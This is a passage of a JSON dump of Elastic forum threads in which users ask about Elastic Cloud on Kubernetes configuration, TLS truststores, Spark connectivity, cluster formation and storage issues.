    "date": "March 4, 2020, 8:49am March 4, 2020, 9:01am March 4, 2020, 1:09pm March 6, 2020, 11:01am March 6, 2020, 4:11pm March 6, 2020, 5:13pm March 6, 2020, 10:49pm March 21, 2020, 6:10am March 21, 2020, 6:19am",
    "body": "Hello here, ECK added support to local remote cluster but how to manually add a remote cluster ? (both are running through ECK) How should we retrieve certificate and inject these into the other cluster ? Thanks if someone can help Matthieu",
    "website_area": "discuss",
    "replies": 9
  },
  {
    "id": "b63ca408-5514-4745-9c2d-e3891f074bf8",
    "url": "https://discuss.elastic.co/t/cannot-initialize-ssl-invalid-keystore-format/223615",
    "title": "Cannot initialize SSL - Invalid keystore format",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "YaSe",
    "date": "March 14, 2020, 12:52pm March 17, 2020, 10:19am March 20, 2020, 1:30pm",
    "body": "Hello all, I have installed an Elasticsearch cluster (ECK) in my Kubernetes cluster (GKE) by using this tutorial. I retrived the CA certificat tls.crt created by my ECK. Then, I used the following command to create a truststore.jks keytool -import -trustcacerts -alias ca_root -file tls.crt -keystore truststore.jks PS: I am using openjdk version \"1.8.0_242\" Then, I create a Kubernetes secret: apiVersion: v1 kind: Secret metadata: name: elasticsearch-truststore-secret namespace: dev type: Opaque data: truststore.jks: <<content of truststore.jks in base64>> Finally, I specified in the configuration of my spark job, the following information: spark.es.nodes.wan.only true spark.es.index.auto.create true spark.es.nodes https://smart-agriculture-elasticsearch-es-http spark.es.port 9200 spark.es.net.http.auth.user elastic spark.es.net.http.auth.pass <<password of elastic user>> spark.es.net.ssl true spark.es.net.ssl.cert.allow.self.signed true spark.es.net.ssl.truststore.location file:///etc/secrets/elasticsearch/truststore.jks spark.es.net.ssl.truststore.pass test1234 spark.kubernetes.driver.secrets.elasticsearch-truststore-secret /etc/secrets/elasticsearch/truststore.jks spark.kubernetes.executor.secrets.elasticsearch-truststore-secret /etc/secrets/elasticsearch/truststore.jks I got the following error: Caused by: java.io.IOException: Invalid keystore format at sun.security.provider.JavaKeyStore.engineLoad(JavaKeyStore.java:663) at sun.security.provider.JavaKeyStore$JKS.engineLoad(JavaKeyStore.java:56) at sun.security.provider.KeyStoreDelegator.engineLoad(KeyStoreDelegator.java:224) at sun.security.provider.JavaKeyStore$DualFormatJKS.engineLoad(JavaKeyStore.java:70) at java.security.KeyStore.load(KeyStore.java:1445) at org.elasticsearch.hadoop.rest.commonshttp.SSLSocketFactory.loadKeyStore(SSLSocketFactory.java:200) at org.elasticsearch.hadoop.rest.commonshttp.SSLSocketFactory.loadTrustManagers(SSLSocketFactory.java:226) at org.elasticsearch.hadoop.rest.commonshttp.SSLSocketFactory.createSSLContext(SSLSocketFactory.java:173) ... 41 more I don't know what I am doing wrong. Does anyone know how to solve this ?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "51d4d5ef-2c7b-4e65-b1f8-847fa2607120",
    "url": "https://discuss.elastic.co/t/how-to-create-keystore-and-truststore-from-ca-certificates/224156",
    "title": "How to create Keystore and Truststore from CA Certificates",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "YaSe",
    "date": "March 18, 2020, 4:34pm March 19, 2020, 9:15am March 20, 2020, 7:39am March 20, 2020, 10:36am March 20, 2020, 12:26pm",
    "body": "Hello folks, I installed ECK on GKE. I retrieved certificate tls.crt with the following command kubectl get secret \"hulk-es-http-certs-public\" -o go-template='{{index .data \"tls.crt\" | base64decode }}' > tls.crt I generated a truststore.jks file with the following command: keytool -import -trustcacerts -alias tls -file tls.crt -keystore truststore.jks Then I created a secret to transmit to give to my Spark Scala job : apiVersion: v1 kind: Secret metadata: name: elasticsearch-truststore-secret namespace: dev type: Opaque data: truststore.jks: <<content of truststore.jks in base64>> But I get the following error: Caused by: org.elasticsearch.hadoop.EsHadoopIllegalStateException: Cannot initialize SSL - Invalid keystore format at ... What am I doing wrong in creating my truststore.jks file ? Thanks,",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "21c33be9-eb45-4c44-b892-3e335c099046",
    "url": "https://discuss.elastic.co/t/kibana-7-6-0-with-eck-has-high-cpu-usage/224398",
    "title": "Kibana 7.6.0 With ECK has high cpu usage",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Mugen",
    "date": "March 20, 2020, 10:57am March 20, 2020, 11:11am",
    "body": "We used to run Kibnana 6.2 with the offical Docker-Image and had a systemload of about 0.2 for the two containers we used. Recently we switched to ECK and Kibana 7.6 and the load of the container is between 0.5 and 2.3. We used the same resources as before. Loading times are fare worese than with the old container. resources: limits: cpu: 300m memory: 1500Mi requests: cpu: 100m memory: 1500Mi Is there some drastic change between this versions ? (I know 6.2 is rather old but the load increase should not be that high or does it?)",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "c0a3ded4-04d7-4349-aca4-9c73720f7ed0",
    "url": "https://discuss.elastic.co/t/an-election-requires-a-node-with-id-stale-state-config/224146",
    "title": "An election requires a node with id [STALE_STATE_CONFIG]",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "admidelu",
    "date": "March 18, 2020, 3:58pm March 18, 2020, 6:19pm",
    "body": "Hey, can't seem to form a cluster using defaults, logs: {\"type\": \"server\", \"timestamp\": \"2020-03-18T14:54:03,323Z\", \"level\": \"WARN\", \"component\": \"o.e.c.c.ClusterFormationFailureHelper\", \"cluster.name\": \"ig-cluster\", \"node.name\": \"ig-cluster-es-masternode-1\", \"message\": \"master not discovered or elected yet, an election requires a node with id [STALE_STATE_CONFIG], have discovered [{ig-cluster-es-masternode-1}{xZ7cq3T5QlOb_FfvxHAqIg}{d8bAOYWLTuexRQQWpbQ8qg}{10.38.128.2}{10.38.128.2:9300}{lm}{ml.machine_memory=21474836480, xpack.installed=true, ml.max_open_jobs=20}, {ig-cluster-es-masternode-2}{85-4QFMIRyG4BGwYKELtNw}{M1u0PE58TzWKy291KGcMig}{10.38.0.1}{10.38.0.1:9300}{lm}{ml.machine_memory=21474836480, ml.max_open_jobs=20, xpack.installed=true}, {ig-cluster-es-masternode-0}{4PRMeSNYSUS2lPvdfL-LVg}{zOjwCE8LT0uJQsWG_rIByg}{10.41.64.1}{10.41.64.1:9300}{lm}{ml.machine_memory=21474836480, ml.max_open_jobs=20, xpack.installed=true}] which is not a quorum; discovery will continue using [127.0.0.1:9300, 127.0.0.1:9301, 127.0.0.1:9302, 127.0.0.1:9303, 127.0.0.1:9304, 127.0.0.1:9305, 10.38.0.1:9300, 10.41.64.1:9300] from hosts providers and [{ig-cluster-es-masternode-1}{xZ7cq3T5QlOb_FfvxHAqIg}{d8bAOYWLTuexRQQWpbQ8qg}{10.38.128.2}{10.38.128.2:9300}{lm}{ml.machine_memory=21474836480, xpack.installed=true, ml.max_open_jobs=20}] from last-known cluster state; node term 3, last-accepted version 34 in term 3\" } My config: apiVersion: elasticsearch.k8s.elastic.co/v1 kind: Elasticsearch metadata: name: ig-cluster spec: version: 7.6.1 nodeSets: - name: masternode count: 3 config: node.master: true node.data: false node.ingest: false cluster.remote.connect: true volumeClaimTemplates: - metadata: name: elasticsearch-data spec: accessModes: - ReadWriteOnce resources: requests: storage: 500Gi storageClassName: local-storage podTemplate: spec: nodeSelector: server: datababe containers: - name: elasticsearch resources: limits: memory: 20Gi cpu: 4 requests: memory: 20Gi cpu: 1 env: - name: ES_JAVA_OPTS value: -Xms10g -Xmx10g # - name: bootstrap.memory_lock # value: true - name: datanode count: 9 config: node.master: false node.data: true node.ingest: true cluster.remote.connect: true volumeClaimTemplates: - metadata: name: elasticsearch-data spec: accessModes: - ReadWriteOnce resources: requests: storage: 750Gi storageClassName: local-storage podTemplate: spec: nodeSelector: server: datababe containers: - name: elasticsearch resources: limits: memory: 28Gi cpu: 5 requests: memory: 28Gi cpu: 1 env: - name: ES_JAVA_OPTS value: -Xms14g -Xmx14g # - name: bootstrap.memory_lock # value: true What does [STALE_STATE_CONFIG] mean and should I override cluster.initial_master_nodes in podTemplate?",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "13b12344-4143-47f4-9c9a-352ac18892b1",
    "url": "https://discuss.elastic.co/t/cannot-disable-tls-and-security-in-eks/222335",
    "title": "Cannot disable TLS and security in EKS",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "yannalbou",
    "date": "March 5, 2020, 4:05pm March 5, 2020, 8:47pm March 5, 2020, 8:50pm March 18, 2020, 1:45pm",
    "body": "Hello, I Installed ECK open source 1.0.1 in k8s 1.15.5 I tried to disable the security and TLS using: apiVersion: elasticsearch.k8s.elastic.co/v1 kind: Elasticsearch metadata: name: elasticsearch spec: version: 7.6.0 nodeSets: - name: default count: 1 config: node.master: true node.data: true node.ingest: true node.store.allow_mmap: false xpack.security.enabled: false xpack.security.http.ssl.enabled: false xpack.security.transport.ssl.enabled: false but it doesn't seem to work: kubectl port-forward service/elasticsearch-es-http 9200 curl http://localhost:9200 ==> not working and PASSWORD=$(kubectl get secret elasticsearch-es-elastic-user -o=jsonpath='{.data.elastic}' | base64 --decode) curl -k -u \"elastic:$PASSWORD\" https://localhost:9200 ==> works If I check the configuration in the 'elasticsearch-es-default-es-config' kubectl get secrets elasticsearch-es-default-es-config -o jsonpath=\"{.data['elasticsearch.yml']}\" | base64 -d I get: cluster: name: elasticsearch discovery: seed_providers: file network: host: 0.0.0.0 publish_host: ${POD_IP} node: data: true ingest: true master: true name: ${POD_NAME} store: allow_mmap: false path: data: /usr/share/elasticsearch/data logs: /usr/share/elasticsearch/logs xpack: license: upload: types: - trial - enterprise security: authc: realms: file: file1: order: -100 native: native1: order: -99 reserved_realm: enabled: \"false\" enabled: \"true\" http: ssl: certificate: /usr/share/elasticsearch/config/http-certs/tls.crt certificate_authorities: /usr/share/elasticsearch/config/http-certs/ca.crt enabled: true key: /usr/share/elasticsearch/config/http-certs/tls.key transport: ssl: certificate: /usr/share/elasticsearch/config/node-transport-cert/transport.tls.crt certificate_authorities: - /usr/share/elasticsearch/config/transport-certs/ca.crt enabled: \"true\" key: /usr/share/elasticsearch/config/node-transport-cert/transport.tls.key verification_mode: certificate which still contains the security and tls config enabled... Any idea on how to disable security and tls config ? Thanks Yann",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "07fbea40-b5e3-4a9b-87df-c5569234495a",
    "url": "https://discuss.elastic.co/t/how-to-scale-up-and-down-nodes-automatically/224089",
    "title": "How to scale up and down nodes automatically?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "doctor",
    "date": "March 18, 2020, 11:25am March 19, 2020, 1:11pm March 18, 2020, 1:33pm",
    "body": "Hey, I am searching for a way to scale up and down ES nodes automatically at runtime. I know I can update the \"kind: Elasticsearch\" yaml to change the number of nodes in the cluster but can this be done by itself? Is there something dedicated in ECK to address this specific matter or should I use the Kubernetes HPA? Using ECK v1.0 Env: On premise Thx",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "d584db8d-644d-4906-b4c4-e4b772dc8718",
    "url": "https://discuss.elastic.co/t/where-are-keystore-and-truststore-how-can-spark-communicate-with-eck-by-using-ssl/223029",
    "title": "Where are Keystore and Truststore: How can Spark communicate with ECK by using SSL",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "YaSe",
    "date": "March 10, 2020, 10:36pm March 14, 2020, 12:38pm March 11, 2020, 4:58pm March 11, 2020, 5:18pm March 14, 2020, 12:38pm",
    "body": "Hello, I followed this link to install ECK and now I want to use Spark with ECK by using SSL. I read the following documentation. However for the following configuration I don't know where to find the keystore and truststore files. es.net.ssl.keystore.type es.net.ssl.truststore.location es.net.ssl.truststore.pass Can someone explain where to find them ? Thanks",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "e1e6d8a3-711a-4ae6-8df2-9e74dc45bc99",
    "url": "https://discuss.elastic.co/t/using-gke-workflow-identity-to-snapshot-and-restore-elasticsearch-data/223156",
    "title": "Using GKE workflow identity to snapshot and restore elasticsearch data",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "",
    "date": "March 11, 2020, 2:23pm March 11, 2020, 3:03pm March 13, 2020, 9:38am",
    "body": "",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "076cfb57-b966-4835-98ff-2340f0ee076b",
    "url": "https://discuss.elastic.co/t/oidc-client-secret-elasticsearch-keystore/223220",
    "title": "OIDC client_secret elasticsearch-keystore",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Victor_Sartori",
    "date": "March 11, 2020, 8:48pm March 11, 2020, 9:00pm March 11, 2020, 9:06pm",
    "body": "I'm trying to use OIDC auth on ES. But If you follow the docs https://www.elastic.co/guide/en/elasticsearch/reference/7.6/oidc-guide-authentication.html, has a step to add manually the client secret on elasticsearch-keystore. My question is: How Can I add this secret? using a init container? This keystore can be shared? Or this is a bug and we can't use this scenario in ECK?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "77be6347-8549-4786-8df9-0d218e2a2840",
    "url": "https://discuss.elastic.co/t/configuration-parameter-syntax-for-nodeselector/222528",
    "title": "Configuration parameter syntax for nodeSelector?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "danielP1",
    "date": "March 6, 2020, 11:50pm March 11, 2020, 7:33am March 11, 2020, 5:17pm",
    "body": "Greetings, I'm attempting to deploy elasticsearch onto k8s with the elasticsearch helm chart: GitHub elastic/helm-charts You know, for Kubernetes. Contribute to elastic/helm-charts development by creating an account on GitHub. I would like to constrain on which nodes the elastisearch components run. I see in the documentation there is a configuration parameter client.nodeselector and the default value is {}. Do I assume correctly that I can pass in key value pairs to constrain elasticsearch to only run on nodes with those label pairs, similar to how nodeSelector is used in a Deployment? For example, to run on all nodes with a env=dev label, I tried `{ \"env\": \"dev\"} when I deployed, but certain components are running on nodes that don't have this label, so perhaps I'm getting the syntax wrong. What is the proper syntax to do this? And, in general, is there some documentation somewhere that specifies how syntax should look for values specified under configuration parameters? e.g. what would values for [] vs {} look like, etc.",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "7acd42f4-0621-4def-94e3-96473cf628fb",
    "url": "https://discuss.elastic.co/t/how-to-run-es-in-a-separate-namespace-from-clients/222802",
    "title": "How to run ES in a separate namespace from clients?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "tew",
    "date": "March 9, 2020, 9:02pm March 9, 2020, 9:26pm March 10, 2020, 10:37pm",
    "body": "I want to put my elasticsearch pods in a separate namespace but I'm not sure how to accomplish this. I have clients running in 2 other namespaces that will need to access the elastic cluster. The secret containing the credentials is created into the same namespace where the elastic pods are running. That means my clients don't have access to it because those pods cannot read secrets outside their namespace. I can copy the secret to another namespace but this will require a manual repeat of this process anytime the secret changes. I've looked into Replicator (https://github.com/mittwald/kubernetes-replicator) to copy the credentials secret to the other namespaces. It works great but I can't figure out how to tell the ES operator to annotate the secret such that Replicator will pick it up. It seems my pattern of placing ES into a separate namespace from the clients is a normal use case and I imagine this has been solved. Can someone point me toward a solution? Thank you, -Terry",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "9d2fc5ce-9efd-4ca6-a90c-2089c49331ea",
    "url": "https://discuss.elastic.co/t/spark-on-k8s-cant-authenticate-to-eck/222764",
    "title": "Spark on k8s can't authenticate to ECK",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "YaSe",
    "date": "March 9, 2020, 4:26pm March 10, 2020, 9:12am March 10, 2020, 11:10am March 10, 2020, 1:18pm",
    "body": "Hello everyone, I am very excited by using Elasticsearch on Kubernetes with Spark but I cant' authenticate my job to it. I successfully installed ECK (without TLS => for test) on my GKE cluster with the following template (thanks to Helm): apiVersion: v1 kind: Secret metadata: name: smart-agriculture-elasticsearch-es-elastic-user # I override the default password for user \"elastic\" created by ECK during its installation namespace: dev type: Opaque data: elastic: dG90bwo= # password is \"toto\" in base64 --- apiVersion: elasticsearch.k8s.elastic.co/v1 kind: Elasticsearch metadata: name: smart-agriculture-elasticsearch namespace: dev spec: version: 7.6.1 nodeSets: - name: default count: 1 config: node.master: true node.data: true node.ingest: true node.store.allow_mmap: false http: tls: selfSignedCertificate: disabled: true Then I want to use my spark job to connect to my Elasticsearch cluster, here is my elasticsearch dependency and my hello world code in scala -- <dependency> <groupId>org.elasticsearch</groupId> <artifactId>elasticsearch-spark-20_2.11</artifactId> <version>7.6.1</version> </dependency> -- import org.apache.spark.SparkContext import org.apache.spark.SparkConf import org.elasticsearch.spark._ object ElasticSparkHelloWorld { def main(args: Array[String]) { val conf = new SparkConf().setAppName(\"spark-es-to-parquet\").setMaster(\"k8s://https://10.0.0.1:443\") conf.set(\"executor.instances\",\"2\") conf.set(\"kubernetes.namespace\", \"dev\") conf.set(\"kubernetes.authenticate.driver.serviceAccountName\", \"spark-sa\") # searvice account created in another template, it works ! conf.set(\"es.index.auto.create\", \"false\") conf.set(\"es.nodes.wan.only\", \"true\") conf.set(\"es.nodes\", \"http://smart-agriculture-elasticsearch-es-http\") conf.set(\"es.port\", \"9200\") conf.set(\"es.net.http.auth.user\", \"elastic\") # user conf.set(\"es.net.http.auth.pass\", \"toto\") # password val sc = new SparkContext(conf) val numbers = Map(\"one\" -> 1, \"two\" -> 2, \"three\" -> 3) val airports = Map(\"arrival\" -> \"Otopeni\", \"SFO\" -> \"San Fran\") sc.makeRDD( Seq(numbers, airports) ).saveToEs(\"spark/docs\") } } However, I get the following error in spark that I don't really understand: Caused by: org.elasticsearch.hadoop.rest.EsHadoopInvalidRequest: org.elasticsearch.hadoop.rest.EsHadoopRemoteException: security_exception: unable to authenticate user [elastic] for REST request [/] In Elasticsearch logs, I have: Authentication to realm file1 failed - Password authentication failed for elastic Does anyone know how to solve this or have information (links, doc..) that I can use ? Thanks !",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "602017d6-b6f5-4eff-b835-85b463cd4433",
    "url": "https://discuss.elastic.co/t/uninstalling-eck-hangs-forever/215521",
    "title": "Uninstalling ECK - hangs forever",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "alexus",
    "date": "January 17, 2020, 8:29pm January 17, 2020, 9:25pm March 5, 2020, 3:26am March 5, 2020, 10:52am March 5, 2020, 3:19pm March 5, 2020, 4:30pm",
    "body": "Hello World! I'm tried to follow Uninstalling ECK | Elastic Cloud on Kubernetes [1.0] | Elastic, however bellow commands hangs forever: $ kubectl get namespaces --no-headers -o custom-columns=:metadata.name \\ > | xargs -n1 kubectl delete elastic --all -n elasticsearch.elasticsearch.k8s.elastic.co \"quickstart\" deleted kibana.kibana.k8s.elastic.co \"quickstart\" deleted Please advise.",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "97704942-3177-447a-b777-a184fd18208b",
    "url": "https://discuss.elastic.co/t/how-to-increase-elastic-pod-volume/222217",
    "title": "How to increase elastic pod volume",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "pingz",
    "date": "March 5, 2020, 7:29am March 5, 2020, 9:29am",
    "body": "My cluster is in yellow state as it does not have enough space to allow shard. I initially tried to increase EBS volume size, but elastic node does not seem to recognize the added storage by querying /_cat/allocation?v. Next I tried to upgrade the pod's volumeClaimTemplates - metadata: name: elasticsearch-data spec: accessModes: - ReadWriteOnce resources: requests: storage: 120Gi storageClassName: gp2enc but admin webhook rejected such a request. See error information below. How can I increase the pod template volume to get my cluster out of yellow state? Error: UPGRADE FAILED: cannot patch \"quickstart\" with kind Elasticsearch: admission webhook \"elastic-es-validation-v1.k8s.elastic.co\" denied the request: Elasticsearch.elasticsearch.k8s.elastic.co \"quickstart\" is invalid: spec.nodeSet[0].volumeClaimTemplates: Invalid value: v1.PersistentVolumeClaim{v1.PersistentVolumeClaim{TypeMeta:v1.TypeMeta{Kind:\"\", APIVersion:\"\"}, ObjectMeta:v1.ObjectMeta{Name:\"elasticsearch-data\", GenerateName:\"\", Namespace:\"\", SelfLink:\"\", UID:\"\", ResourceVersion:\"\", Generation:0, CreationTimestamp:v1.Time{Time:time.Time{wall:0x0, ext:0, loc:(*time.Location)(nil)}}, DeletionTimestamp:(*v1.Time)(nil), DeletionGracePeriodSeconds:(*int64)(nil), Labels:map[string]string(nil), Annotations:map[string]string(nil), OwnerReferences:v1.OwnerReference(nil), Finalizers:string(nil), ClusterName:\"\", ManagedFields:v1.ManagedFieldsEntry(nil)}, Spec:v1.PersistentVolumeClaimSpec{AccessModes:v1.PersistentVolumeAccessMode{\"ReadWriteOnce\"}, Selector:(*v1.LabelSelector)(nil), Resources:v1.ResourceRequirements{Limits:v1.ResourceList(nil), Requests:v1.ResourceList{\"storage\":resource.Quantity{i:resource.int64Amount{value:128849018880, scale:0}, d:resource.infDecAmount{Dec:(*inf.Dec)(nil)}, s:\"\", Format:\"BinarySI\"}}}, VolumeName:\"\", StorageClassName:(*string)(0xc000644ff0), VolumeMode:(*v1.PersistentVolumeMode)(nil), DataSource:(*v1.TypedLocalObjectReference)(nil)}, Status:v1.PersistentVolumeClaimStatus{Phase:\"\", AccessModes:v1.PersistentVolumeAccessMode(nil), Capacity:v1.ResourceList(nil), Conditions:v1.PersistentVolumeClaimCondition(nil)}}}: Volume claim templates cannot be modified",
    "website_area": "discuss",
    "replies": 2
  },
  {
    "id": "cd6e869e-65d1-454e-8cd8-4fcad7df0b01",
    "url": "https://discuss.elastic.co/t/error-migrating-elastic-search-from-7-5-0-to-7-6-0/219841",
    "title": "Error migrating elastic search from 7.5.0 to 7.6.0",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Benoit_V",
    "date": "February 18, 2020, 5:18pm February 18, 2020, 6:01pm March 2, 2020, 9:45am",
    "body": "Hello, when updating my elasticsearch cluster from 7.5.0 to 7.6.0, the new pods do not start due to a file permission issue: ERROR: File ..data/elastic-internal-probe (target of symlink /mnt/elastic-internal/probe-user/elastic-internal-probe from PROBE_PASSWORD_FILE) must have file permissions 400 or 600, but actually has: 644 I have other deployments that do not have that issue, any idea how to fix this?",
    "website_area": "discuss",
    "replies": 3
  },
  {
    "id": "c742b8f4-c5d1-4f88-a01e-c1674f3bee83",
    "url": "https://discuss.elastic.co/t/connect-to-elasticsearch-with-transportclient/218795",
    "title": "Connect to Elasticsearch with TransportClient",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Sebastien_Falquier",
    "date": "February 11, 2020, 2:56pm February 13, 2020, 2:19pm February 14, 2020, 8:59am February 18, 2020, 9:24am February 20, 2020, 10:10am March 2, 2020, 9:41am",
    "body": "Hello, Even if java TransportClient is deprecated, I need to connect on port 9300 to an elasticsearch cluster deployed with ECK operator. Devops team has worked to open port 9300 on quickstart-es-http service so that it looks like this : apiVersion: v1 kind: Service metadata: creationTimestamp: \"2020-01-17T10:33:56Z\" labels: common.k8s.elastic.co/type: elasticsearch elasticsearch.k8s.elastic.co/cluster-name: quickstart name: quickstart-es-http namespace: default ownerReferences: - apiVersion: elasticsearch.k8s.elastic.co/v1 blockOwnerDeletion: true controller: true kind: Elasticsearch name: quickstart uid: dd235882-3914-11ea-b5af-42010a8401b1 resourceVersion: \"209164059\" selfLink: /api/v1/namespaces/default/services/quickstart-es-http uid: dd27e974-3914-11ea-b5af-42010a8401b1 spec: clusterIP: 10.47.249.165 ports: - name: http port: 9200 protocol: TCP targetPort: 9200 - name: inc port: 9300 protocol: TCP targetPort: 9300 selector: common.k8s.elastic.co/type: elasticsearch elasticsearch.k8s.elastic.co/cluster-name: quickstart sessionAffinity: None type: ClusterIP status: loadBalancer: {} ... but I still cannot connect to the cluster with the TransportClient (famous NoNodeAvailableException) whereas I have no problem to connect with the java high level REST client. Any tips to fix this issue?",
    "website_area": "discuss",
    "replies": 6
  },
  {
    "id": "cc505d0b-c287-4bab-93df-14feb4fbe790",
    "url": "https://discuss.elastic.co/t/eck-with-nfs-shared-persistent-volume/221073",
    "title": "ECK with NFS shared persistent volume",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "SergeyK",
    "date": "February 26, 2020, 4:00pm February 26, 2020, 9:54pm February 26, 2020, 10:21pm March 2, 2020, 9:29am",
    "body": "Hi, Did somebody manage to deploy Elasticserach with shared NFS volume (one volume for all pods)? All my nodes are in VMs (above private lab bare metal servers). There is dedicated NFS server created and all k8s nodes have mounts to it. Most common error is: ProvisioningFailed persistentvolumeclaim/elasticsearch-data-elasticsearch-candidate-es-master-1 storageclass.storage.k8s.io \"standard\" not found But volume with storageclass standard is there (kubectl get pv shows it). I managed to deploy one master node only and it sees NFS directory (I see \"nodes/0\" directory created by ECK) but when I add a new master or data nodes, everything becomes in pending status (pods/containers are not created so I cannot \"kubectl logs pod_name\"). I tried NFS 3 and 4. volume definition example: metadata: name: standard spec: capacity: storage: 10Gi volumeMode: Filesystem accessModes: - ReadWriteOnce persistentVolumeReclaimPolicy: Recycle storageClassName: standard nfs: path: /mnt/elasticdata server: 123.45.67.89 claim example: volumeClaimTemplates: - metadata: name: elasticsearch-data spec: accessModes: - ReadWriteMany resources: requests: storage: 2Gi storageClassName: standard BTW, is it good idea to use shared volume for all elasticsearch data nodes?",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "a7d65a00-ad2c-48e6-857e-dea9d236e463",
    "url": "https://discuss.elastic.co/t/how-to-define-multiple-path-data-pointing-to-separate-volumes-or-pvc-using-eck/218644",
    "title": "How to define multiple path.data pointing to separate volumes or PVC using ECK?",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "ykozlov",
    "date": "February 10, 2020, 4:55pm February 18, 2020, 9:11am February 27, 2020, 1:33pm March 2, 2020, 9:23am",
    "body": "Hi! elasticsearch.yml supports configuration setting where I can specify multiple data path for the ES data node as follows: path.data: - \"/mnt/data1', - \"/mnt/data2\" - \"/mnt/data3\" I can define additional volumes and/or PVC using spec.nodeSets.volumeClaimTemplates When I define additional volumes using pod spec.volumeClaimTemplates however, when I specify: spec: version: 7.5.1 nodeSets: - name: default config: path.data: [ \"/mnt/data1', \"/mnt/data2\", \"/mnt/data3\" ] I cant an error from kubernetes operator that path.data is no configurable. Is there a way to achieve this configuration using ECK? Thank you in advance!",
    "website_area": "discuss",
    "replies": 4
  },
  {
    "id": "314c50cc-10b4-4cc5-8646-4c43a13e4bf8",
    "url": "https://discuss.elastic.co/t/kibana-volume/220653",
    "title": "Kibana volume",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "Adrian_Birladeanu",
    "date": "February 24, 2020, 1:01pm March 1, 2020, 4:32pm March 2, 2020, 6:15am March 2, 2020, 6:34am March 2, 2020, 6:56am",
    "body": "Hello. I would like to create a kibana deployment with persistent storage using the new kubernetes operator. Is there any way to do this? I have tried adding a volumeClaimTemplates, but it's disregarded. Thank you.",
    "website_area": "discuss",
    "replies": 5
  },
  {
    "id": "065d87f6-b193-4214-b217-b9cbe132493c",
    "url": "https://discuss.elastic.co/t/enable-rum-on-apm-eck/220994",
    "title": "Enable RUM on APM (ECK)",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "hjoost",
    "date": "February 26, 2020, 10:40am February 26, 2020, 10:06am February 26, 2020, 10:35am February 26, 2020, 10:39am February 26, 2020, 12:49pm February 26, 2020, 2:18pm February 26, 2020, 2:21pm",
    "body": "Hi, I'm trying to enable RUM in my ECK deployment. I've added this to my yaml config, but it doesn't work: apiVersion: apm.k8s.elastic.co/v1 kind: ApmServer metadata: name: apm-server-quickstart namespace: default spec: version: 7.6.0 count: 1 secureSettings: - secretName: apm-secret-settings config: output: elasticsearch: hosts: [\"quickstart-es-http:9200\"] username: elastic password: \"${ES_PASSWORD}\" protocol: \"https\" ssl.certificate_authorities: [\"/usr/share/apm-server/config/elasticsearch-ca/tls.crt\"] rum: enabled: true event_rate: limit: 300 lru_size: 1000 allow_origins: ['*'] library_pattern: \"node_modules|~\" exclude_from_grouping: \"^/webpack\" source_mapping: enabled: true cache: expiration: 5m index_pattern: \"apm-*-source_map*\" elasticsearchRef: name: quickstart podTemplate: spec: containers: - name: apm-server volumeMounts: - mountPath: /usr/share/apm-server/config/elasticsearch-ca name: elasticsearch-ca readOnly: true volumes: - name: elasticsearch-ca secret: defaultMode: 420 optional: false secretName: es-ca # This is the secret that holds the Elasticsearch CA cert Can anyone give me a hint what I'm doing wrong? Thank you!",
    "website_area": "discuss",
    "replies": 7
  },
  {
    "id": "d9e1d8fe-60b8-4068-b321-a48ba5e6ecd1",
    "url": "https://discuss.elastic.co/t/elasicsearch-cluster-is-not-created/220415",
    "title": "Elasicsearch cluster is not created",
    "category": [
      "Elastic Cloud on Kubernetes (ECK)"
    ],
    "author": "dg_hivebrite",
    "date": "February 21, 2020, 4:19pm February 21, 2020, 5:06pm February 25, 2020, 2:07pm February 25, 2020, 2:18pm February 25, 2020, 2:54pm February 25, 2020, 3:07pm February 25, 2020, 3:34pm February 25, 2020, 3:35pm February 25, 2020, 4:42pm February 25, 2020, 5:14pm February 25, 2020, 5:18pm February 25, 2020, 5:48pm",
